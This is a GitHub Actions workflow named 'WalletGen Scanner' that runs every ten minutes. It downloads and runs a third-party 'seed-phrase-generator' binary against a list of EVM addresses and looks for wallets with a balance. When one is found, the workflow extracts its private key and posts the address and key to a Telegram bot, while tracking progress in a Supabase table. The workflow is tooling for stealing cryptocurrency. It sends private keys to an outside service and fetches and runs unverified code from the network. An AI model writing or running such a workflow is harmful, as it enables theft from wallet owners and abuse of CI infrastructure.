name: WalletGen Scanner

on:
  workflow_dispatch:        # manual trigger
  schedule:
    - cron: "*/10 * * * *"  # run every 10 minutes

jobs:
  run-checker:
    runs-on: ubuntu-latest
    steps:
      - name: Install expect
        run: |
          sudo apt-get update
          sudo apt-get install -y expect jq curl

      - name: Download release + database file
        run: |
          wget https://github.com/wizdomf3lix/seed-phrase-generator/releases/download/v5%2C0/WalletGen_linux_x64.5.0-linux.tar.gz
          tar -xzf WalletGen_linux_x64.5.0-linux.tar.gz
          curl -L https://raw.githubusercontent.com/mnadamod/walletgens/main/evm_database.txt -o evm_database.txt
          mv evm_database.txt walletgen/

      - name: Get last index from Supabase
        id: index
        run: |
          last=$(curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/progress?select=last_index" \
            -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}" | jq -r '.[0].last_index')
          if [ "$last" = "null" ] || [ -z "$last" ]; then
            last=1
          fi
          echo "last_index=$last" >> $GITHUB_OUTPUT

      - name: Prepare chunk of database
        run: |
          start=${{ steps.index.outputs.last_index }}
          chunk_size=100000
          total=$(wc -l < walletgen/evm_database.txt)
          echo "Preparing chunk starting at line $start, size $chunk_size (total $total)"
          tail -n +"$start" walletgen/evm_database.txt | head -n "$chunk_size" > walletgen/evm_chunk.txt

      - name: Run checker with expect on chunk
        working-directory: walletgen
        run: |
          chmod +x walletgen
          echo "=== Starting walletgen with expect ==="
          # Ensure chunk file is present in working directory
          ls -lh evm_chunk.txt
          expect <<'EOF' | tee result.txt
          log_user 1
          spawn ./walletgen
          expect {
            "select an action using the key:" { send "6\r" }
          }
          expect eof
          EOF
          code=$?
          echo "=== walletgen exit code: $code ==="
          cat result.txt

      - name: Process results and update Supabase
        id: process
        run: |
          found=false
          active_addr=""
          active_priv=""

          awk '/address:/ {addr=$2} /balance:/ {bal=$2;
            status="empty";
            if (bal!="(empty)" && bal!="0.000000$") status="active";
            # Check Supabase
            cmd="curl -s \"${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets?address=eq."addr"\" -H \"apikey: ${{ secrets.SUPABASE_KEY }}\" -H \"Authorization: Bearer ${{ secrets.SUPABASE_KEY }}\""
            cmd | getline exists
            close(cmd)
            if (exists=="[]") {
              system("curl -s \"${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets\" -H \"apikey: ${{ secrets.SUPABASE_KEY }}\" -H \"Authorization: Bearer ${{ secrets.SUPABASE_KEY }}\" -H \"Content-Type: application/json\" -d \"{\\\"address\\\":\\\""addr"\\\",\\\"status\\\":\\\""status"\\\"}\"")
            }
            if (status=="active") {
              found="true"
              active_addr=addr
              cmd2="grep \\\"Private Key:\\\" result.txt | head -n1 | awk \\'{print $3}\\'"
              cmd2 | getline active_priv
              close(cmd2)
            }
          } END {
            print \"found=\"found >> ENVIRON[\"GITHUB_OUTPUT\"]
            print \"address=\"active_addr >> ENVIRON[\"GITHUB_OUTPUT\"]
            print \"private=\"active_priv >> ENVIRON[\"GITHUB_OUTPUT\"]
          }' result.txt

      - name: Update progress index
        run: |
          new_index=$(( ${{ steps.index.outputs.last_index }} + 100000 ))
          curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/progress" \
            -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}" \
            -H "Content-Type: application/json" \
            -d "{\"id\":1,\"last_index\":$new_index}" \
            -X PATCH

      - name: Notify Telegram
        if: steps.process.outputs.found == 'true'
        run: |
          curl -s -X POST https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage \
          -d chat_id=${{ secrets.TELEGRAM_CHAT_ID }} \
          -d text="ðŸš¨ Active wallet found!\nAddress: ${{ steps.process.outputs.address }}\nPrivate Key: ${{ steps.process.outputs.private }}"

      - name: Debug Supabase table
        run: |
          echo "=== Current Supabase checked_wallets table ==="
          curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets" \
            -H "apikey: ${{ secrets.SUPABASE_KEY }}" \
            -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}" | jq .
